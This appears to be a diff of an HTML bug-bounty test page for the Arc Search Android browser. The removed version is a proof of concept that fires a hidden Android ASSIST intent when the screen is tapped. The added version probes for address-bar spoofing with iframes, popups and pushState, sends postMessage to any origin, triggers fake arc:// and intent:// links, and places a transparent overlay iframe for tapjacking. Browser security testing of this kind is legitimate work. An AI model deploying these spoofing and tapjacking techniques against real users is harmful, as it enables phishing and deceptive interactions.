@@ -1,80 +1,232 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Simultaneous Keyboard & Intent PoC</title>
-<style>
-  body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background-color: #1a1a1a;
-    color: #00ffcc;
-    font-family: monospace;
-    overflow: hidden;
-  }
-  
-  #trigger-box {
-    width: 80vw;
-    height: 30vh;
-    border: 2px dashed #00ffcc;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 1.2rem;
-    text-align: center;
-  }
-
-  /* Keyboard trigger - invisible but focusable */
-  #ghost-input {
-    position: absolute;
-    top: -1000px; /* Viewport ke bahar rakha hai */
-    opacity: 0.01;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arc Search Android - Bug Bounty Test Suite</title>
+    <style>
+        body { font-family: monospace; background: #0d0d0d; color: #00ff41; padding: 20px; }
+        .box { background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; margin: 10px 0; border-radius: 8px; }
+        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; font-weight: bold; border-radius: 4px; }
+        button:hover { background: #00cc33; }
+        input { background: #1a1a1a; color: #00ff41; border: 1px solid #00ff41; padding: 8px; width: 80%; }
+        .danger { color: #ff4444; }
+        .success { color: #00ff41; }
+        hr { border-color: #00ff41; }
+        iframe { width: 100%; height: 300px; border: 1px solid #333; }
+    </style>
 </head>
 <body>
 
-  <div id="trigger-box">
-    TAP TO EXECUTE
-  </div>
+    <h1>🧪 Arc Search Android - Bug Bounty Test Suite</h1>
+    <p><span class="danger">⚠️ USE ONLY FOR AUTHORIZED TESTING</span> | Target: <strong>Address Bar Spoofing • Redirects • Popups • Sandbox Bypass</strong></p>
+    <hr>
 
-  <input type="text" id="ghost-input" autocomplete="off">
+    <!-- ========== TEST 1: IFRAME SPOOF ========== -->
+    <div class="box">
+        <h2>🎯 Test 1: Iframe URL Spoofing</h2>
+        <p>Ye iframe <strong>google.com</strong> dikha raha hai, lekin address bar me kya show ho raha?</p>
+        <iframe src="https://www.google.com"></iframe>
+        <br><br>
+        <button onclick="spoofIframe()">🔄 Spoof Iframe Source</button>
+        <button onclick="resetIframe()">↩️ Reset</button>
+        <p id="iframeStatus" class="success">Status: Ready</p>
+    </div>
 
-<script>
-  const triggerBox = document.getElementById('trigger-box');
-  const ghostInput = document.getElementById('ghost-input');
+    <!-- ========== TEST 2: POPUP & WINDOW.OPEN ========== -->
+    <div class="box">
+        <h2>🎯 Test 2: Popup / window.open() Attacks</h2>
+        <p>Ye check karega ki Arc Search popup ko handle kaise karta hai aur kya address bar me fake URL show hota hai?</p>
+        <button onclick="openFakePopup()">📤 Open Fake Popup (google.com)</button>
+        <button onclick="openBlankPopup()">📄 Open Blank Popup with URL Manipulation</button>
+        <p id="popupStatus" class="success">Status: Ready</p>
+    </div>
 
-  triggerBox.addEventListener('touchend', (e) => {
-    // Default scroll/click behavior ko rokenge
-    e.preventDefault(); 
+    <!-- ========== TEST 3: REDIRECT CHAIN ========== -->
+    <div class="box">
+        <h2>🎯 Test 3: Redirect Chain & History Manipulation</h2>
+        <p>Multiple redirects ke through address bar spoof check karega.</p>
+        <button onclick="startRedirectChain()">🔗 Start Redirect Chain</button>
+        <button onclick="historyPushState()">📜 history.pushState() Test</button>
+        <p id="redirectStatus" class="success">Status: Ready</p>
+    </div>
 
-    // 1. Keyboard Focus (Synchronous)
-    ghostInput.focus();
+    <!-- ========== TEST 4: SANDBOX BYPASS ========== -->
+    <div class="box">
+        <h2>🎯 Test 4: Sandbox / SOP Bypass Attempts</h2>
+        <p>Cross-origin access aur postMessage vulnerabilities check karega.</p>
+        <button onclick="testPostMessage()">📨 PostMessage Test</button>
+        <button onclick="testFetch()">🌐 Fetch Cross-Origin Test</button>
+        <p id="sandboxStatus" class="success">Status: Ready</p>
+    </div>
 
-    // 2. Fullscreen Request (Asynchronous promise, but initiated synchronously)
-    if (!document.fullscreenElement) {
-      document.documentElement.requestFullscreen().catch(err => {
-        console.error("Fullscreen error:", err);
-      });
-    }
+    <!-- ========== TEST 5: DEEP LINK / INTENT ========== -->
+    <div class="box">
+        <h2>🎯 Test 5: Deep Link / Intent URI Spoof</h2>
+        <p>Kya Arc Search intent URIs ko sahi se handle karta hai? Ye fake `arc://` aur `intent://` links hain.</p>
+        <button onclick="fakeDeepLink()">🔗 Fake arc://settings</button>
+        <button onclick="fakeIntent()">📲 Fake intent://google.com</button>
+        <p id="deepLinkStatus" class="success">Status: Ready</p>
+    </div>
 
-    // 3. Intent Execution (Synchronous navigation command)
-    const assistantIntent = "intent:#Intent;action=android.intent.action.ASSIST;end";
-    
-    // Iframe ke through intent trigger karna (Main page state ko zinda rakhne ke liye ek trick)
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = assistantIntent;
-    document.body.appendChild(iframe);
+    <!-- ========== TEST 6: UI REDRESS / TAPJACKING ========== -->
+    <div class="box">
+        <h2>🎯 Test 6: UI Redress / Tapjacking</h2>
+        <p>Transparent iframe overlay ke through click jacking attempt.</p>
+        <button onclick="injectOverlay()">🕵️ Inject Overlay Iframe</button>
+        <button onclick="removeOverlay()">❌ Remove Overlay</button>
+        <div id="overlayContainer" style="position:relative; height:100px;"></div>
+        <p id="uiStatus" class="success">Status: Ready</p>
+    </div>
 
-    // Agar iframe intent block ho jaye, toh immediate fallback
-    window.location.href = assistantIntent;
+    <!-- ========== LOGGING ========== -->
+    <div class="box">
+        <h2>📋 Test Log</h2>
+        <div id="log" style="background:#0a0a0a; padding:10px; height:150px; overflow-y:scroll; font-size:12px; color:#aaa;"></div>
+        <button onclick="clearLog()">🗑️ Clear Log</button>
+    </div>
 
-  });
-</script>
+    <!-- ========== SCRIPT ========== -->
+    <script>
+        function log(msg) {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            logDiv.innerHTML += `[${time}] ${msg}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+        }
+
+        // ----- TEST 1: IFRAME SPOOF -----
+        function spoofIframe() {
+            const iframe = document.querySelector('iframe');
+            // Try to load a different domain while keeping address bar same
+            iframe.src = 'https://www.wikipedia.org';
+            document.getElementById('iframeStatus').innerHTML = '⚠️ Iframe ab Wikipedia dikha raha hai — address bar check karo!';
+            log('🔴 TEST 1: Iframe src changed to wikipedia.org (address bar spoof attempt)');
+        }
+
+        function resetIframe() {
+            document.querySelector('iframe').src = 'https://www.google.com';
+            document.getElementById('iframeStatus').innerHTML = '✅ Reset to Google';
+            log('🔄 Iframe reset to google.com');
+        }
+
+        // ----- TEST 2: POPUP -----
+        function openFakePopup() {
+            const win = window.open('https://www.google.com', '_blank', 'width=400,height=600');
+            if (!win) {
+                log('❌ Popup blocked! Arc Search ne block kar diya.');
+                document.getElementById('popupStatus').innerHTML = '❌ Popup Blocked';
+            } else {
+                log('🔴 TEST 2: Popup opened with google.com — check if address bar shows google.com or malicious URL');
+                document.getElementById('popupStatus').innerHTML = '⚠️ Popup open hai — address bar inspect karo!';
+            }
+        }
+
+        function openBlankPopup() {
+            const win = window.open('about:blank', '_blank');
+            if (win) {
+                win.document.write('<html><head><title>Fake</title></head><body><h1>Fake Google Page</h1><p>Address bar kya dikha raha hai?</p></body></html>');
+                win.document.close();
+                log('🔴 TEST 2: Blank popup with fake content — address bar spoof possible?');
+                document.getElementById('popupStatus').innerHTML = '⚠️ Blank popup injected — address bar check karo!';
+            } else {
+                log('❌ Popup blocked');
+            }
+        }
+
+        // ----- TEST 3: REDIRECT CHAIN -----
+        function startRedirectChain() {
+            log('🔴 TEST 3: Starting redirect chain — watch address bar');
+            document.getElementById('redirectStatus').innerHTML = '⏳ Redirecting...';
+            // Multiple redirects via location
+            setTimeout(() => {
+                location.href = 'https://www.example.com';
+            }, 1000);
+            // This will actually redirect — use with caution
+            // For safer testing, we simulate:
+            setTimeout(() => {
+                document.getElementById('redirectStatus').innerHTML = '⚠️ Redirect chain triggered — check URL bar!';
+            }, 500);
+        }
+
+        function historyPushState() {
+            // Fake history entry
+            history.pushState({ page: 1 }, 'Fake Google', 'https://www.google.com/fake');
+            log('🔴 TEST 3: history.pushState() called — address bar me "google.com" dikh raha hai?');
+            document.getElementById('redirectStatus').innerHTML = '⚠️ history.pushState() — address bar spoofed?';
+        }
+
+        // ----- TEST 4: SANDBOX -----
+        function testPostMessage() {
+            const iframe = document.querySelector('iframe');
+            try {
+                iframe.contentWindow.postMessage('TEST_DATA', '*');
+                log('🔴 TEST 4: PostMessage sent — check if any response or error');
+                document.getElementById('sandboxStatus').innerHTML = '⚠️ PostMessage sent — watch console for errors';
+            } catch(e) {
+                log('✅ PostMessage blocked (SOP working): ' + e.message);
+                document.getElementById('sandboxStatus').innerHTML = '✅ Blocked: ' + e.message;
+            }
+        }
+
+        function testFetch() {
+            fetch('https://api.github.com/users/octocat')
+                .then(res => res.json())
+                .then(data => {
+                    log('✅ Fetch successful — but check if it\'s allowed');
+                    document.getElementById('sandboxStatus').innerHTML = '✅ Fetch worked — CORS?';
+                })
+                .catch(err => {
+                    log('❌ Fetch failed: ' + err.message);
+                    document.getElementById('sandboxStatus').innerHTML = '❌ Blocked: ' + err.message;
+                });
+        }
+
+        // ----- TEST 5: DEEP LINK -----
+        function fakeDeepLink() {
+            // Create a fake arc:// link
+            const link = document.createElement('a');
+            link.href = 'arc://settings/fake';
+            link.click();
+            log('🔴 TEST 5: Fake arc:// link triggered — Arc Search handled it?');
+            document.getElementById('deepLinkStatus').innerHTML = '⚠️ arc:// link triggered — observe behavior';
+        }
+
+        function fakeIntent() {
+            const link = document.createElement('a');
+            link.href = 'intent://google.com#Intent;action=VIEW;end';
+            link.click();
+            log('🔴 TEST 5: Fake intent:// link triggered');
+            document.getElementById('deepLinkStatus').innerHTML = '⚠️ intent:// link triggered';
+        }
+
+        // ----- TEST 6: UI REDRESS -----
+        function injectOverlay() {
+            const container = document.getElementById('overlayContainer');
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.google.com';
+            iframe.style.cssText = 'position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.3; pointer-events:auto; z-index:999;';
+            iframe.id = 'overlayIframe';
+            container.appendChild(iframe);
+            log('🔴 TEST 6: Transparent overlay iframe injected — tapjacking possible?');
+            document.getElementById('uiStatus').innerHTML = '⚠️ Overlay active — try clicking on it';
+        }
+
+        function removeOverlay() {
+            const overlay = document.getElementById('overlayIframe');
+            if (overlay) overlay.remove();
+            log('🔄 Overlay removed');
+            document.getElementById('uiStatus').innerHTML = '✅ Overlay removed';
+        }
+
+        // Initial log
+        log('🚀 Test Suite Loaded — All tests ready!');
+        log('💡 Start testing each section and watch the address bar + console.');
+    </script>
+
 </body>
 </html>
